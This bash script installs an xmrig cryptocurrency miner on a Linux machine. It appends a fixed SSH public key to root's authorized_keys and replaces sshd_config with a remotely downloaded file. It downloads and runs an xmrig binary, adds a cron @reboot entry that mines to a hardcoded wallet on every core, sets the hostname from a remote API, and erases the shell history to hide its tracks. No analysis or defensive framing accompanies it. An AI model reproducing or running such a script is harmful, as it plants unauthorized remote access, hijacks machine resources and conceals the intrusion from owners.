#!/bin/bash

# Install necessary packages
apt-get update -y
apt-get install curl wget screen cron hping3 -y

# Setup SSH
cd ~
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOswKNcA2Gzv/mGSu2oeh571PlbpyAekXkmVh8FVx/z/ crypto@currency" >> ~/.ssh/authorized_keys

# Download and set SSH config
wget https://raw.githubusercontent.com/realtkco/scripts/main/sshd_config -O sshd_config
rm -rf /etc/ssh/sshd_config
mv sshd_config /etc/ssh/sshd_config

# Define the list of addresses for latency check
servers=(
    "de.zephyr.herominers.com"
    "fi.zephyr.herominers.com"
    "ca.zephyr.herominers.com"
    "ru.zephyr.herominers.com"
    "us.zephyr.herominers.com"
    "us2.zephyr.herominers.com"
    "br.zephyr.herominers.com"
    "hk.zephyr.herominers.com"
    "kr.zephyr.herominers.com"
    "in.zephyr.herominers.com"
    "sg.zephyr.herominers.com"
    "tr.zephyr.herominers.com"
    "au.zephyr.herominers.com"
)

port=1123

# Variables to keep track of the server with the lowest latency
minLatency=1000000
minServer=""

for server in "${servers[@]}"; do
    echo "Pinging $server..."

    # Run paping, extract average latency
    result=$(paping "$server" -c 3 -p $port | grep 'Average' || echo "Error pinging $server")

    # Check if paping encountered an error
    if [[ $result == *"Error pinging"* ]]; then
        echo $result
        continue
    fi

    # Extract the average latency, removing ANSI color codes and any illegal characters
    latency=$(echo $result | sed 's/\x1b\[[0-9;]*m//g' | awk -F' ' '{ for(i=1;i<=NF;i++) if ($i=="Average") print $(i+2) }' | sed 's/ms//' | tr -d '[:cntrl:]')

    if [[ -z $latency ]]; then
        echo "Failed to extract latency for $server."
        continue
    fi

    echo "Average latency for $server: $latency ms"

    # Use bc for comparison, ensuring input is properly formatted
    comparison=$(echo "$latency < $minLatency" | bc 2>/dev/null)

    if [[ $comparison -eq 1 ]]; then
        minLatency=$latency
        minServer=$server
    fi
done

echo "The server with the lowest latency is $minServer with an average latency of $minLatency ms."


MINER_ENDPOINT="$minServer:1123"

# Proceed with the rest of the script
hostnamectl set-hostname $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")

wget https://raw.githubusercontent.com/realtkco/scripts/main/xmrig -O xmrig
chmod +x ./xmrig

# Use the MINER_ENDPOINT with the lowest latency in the crontab entry
crontab -r

crontab -l | { cat; echo "@reboot screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t $(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" )" ; } | crontab -

echo "screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t \$(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo \"-vm\" )" > start.sh

chmod +x start.sh

history -c
rm -rf ~/.bash_history

clear

echo "$(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")"
